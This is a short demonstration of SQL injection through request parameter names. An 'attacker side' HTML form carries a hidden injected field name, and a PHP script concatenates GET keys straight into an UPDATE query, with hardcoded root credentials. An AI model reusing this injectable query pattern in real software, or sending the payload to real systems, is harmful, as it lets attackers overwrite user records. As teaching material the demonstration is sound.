<-- The Attacker Side -->
<form action="/backdoor.php" type="hidden">
<input name='username="hacked for the 2nd time"where"1"="1";#' value="" type="hidden">
<input name="username" value="demo" type="hidden">
<input name="id" value=1 type="hidden">
<input type="submit"> 
</form>
<?php
    // Server Side
$database=new pdo("mysql:host=localhost;dbname=dat","root","17095674");
$params=array();
$set="";
foreach($_GET as $key=>$value){

    if($key!="id"){
$set.=$key."=".":$key";

    }
    $params[$key]=$value;
}
$cmd="UPDATE USERS SET $set WHERE ID=:id";
    /*it will be something like this:
     UPDATE USERS SET $setusername="hacked for the 2nd time"where"1"="1"  --the rest of the code will be ignored.. check this by doing echo to $cmd
    
    */
echo $cmd;
$database->prepare($cmd)->execute($params);
?>
